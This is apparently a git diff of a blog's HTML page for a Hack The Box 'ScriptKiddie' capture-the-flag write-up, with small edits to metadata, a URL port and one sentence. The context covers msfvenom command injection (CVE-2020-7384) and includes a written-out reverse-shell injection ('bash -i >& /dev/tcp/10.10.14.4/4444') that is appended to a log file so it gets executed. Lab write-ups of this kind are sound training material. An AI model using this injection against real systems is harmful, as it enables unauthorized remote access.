@@ -44,7 +44,7 @@ Reconnaissance Port Scan We will start our port scan by using nmap, specifically
 <meta itemprop="description" content="Overview ScriptKiddie is an easy linux box, designed by 0xdf. Overall the exploitation of this box consists of a command injection vulnerability in Metasploit Framework&rsquo;s msfvenom payload generator to get access as a low privileged user. From there, a command injection to reach the next user and a pretty straight forward sudo access privilege escalation method to get root.
 Reconnaissance Port Scan We will start our port scan by using nmap, specifically the following command:"><meta itemprop="datePublished" content="2021-06-07T15:58:22&#43;03:00" />
 <meta itemprop="dateModified" content="2021-06-07T15:58:22&#43;03:00" />
-<meta itemprop="wordCount" content="578"><meta itemprop="image" content="https://chrm4n.github.io"/>
+<meta itemprop="wordCount" content="555"><meta itemprop="image" content="https://chrm4n.github.io"/>
 <meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://chrm4n.github.io"/>
 
@@ -154,7 +154,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: k1d'5 h4ck3r t00l5
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre><h2 id="port-5000">Port 5000</h2>
-<p>By visiting the web server at <a href="http://10.10.10.233:500/">http://10.10.10.233:500/</a> we land on the following page:</p>
+<p>By visiting the web server at <strong>http://10.10.10.233:5000/</strong> we land on the following page:</p>
 <p><img src="https://chrm4n.github.io/ScriptKiddie/webserver.png" alt="webserver.png"></p>
 <p>By observing the web page, there are three tools available for use: Nmap, MsfVenom and Searchsploit. They all work as expected. Searching for known vulnerabilities on the above 3 tools we get the following promising exploit:<br>
 <code>CVE-2020-7384</code>: <a href="https://www.exploit-db.com/exploits/49491">MsfVenom APK template command injection</a>.</p>
@@ -184,7 +184,7 @@ done
 
 if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
 kid@scriptkiddie:/home/pwn$ 
-</code></pre><p>This script is responsible for the first tool on the web server which scans the top 100 ports on an IP using nmap. The script executes an nmap scan on the target IP while the statement is true, otherwise it writes the information to the <strong>/home/kid/logs/hackers</strong> file. In order to get a shell as pwn we will inject the following command into the <em>hackers</em> file:</p>
+</code></pre><p>This script executes an nmap scan on the target IP while the statement is true, otherwise it writes the information to the <strong>/home/kid/logs/hackers</strong> file. In order to get a shell as pwn we will inject the following command into the <em>hackers</em> file:</p>
 <pre><code class="language-console" data-lang="console">echo &quot;  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1' #&quot; &gt;&gt; hackers
 </code></pre><p>After a few seconds we get a reverse shell on our listener:
 <img src="https://chrm4n.github.io/ScriptKiddie/shell_as_pwn.png" alt="shell_as_pwn.png"></p>
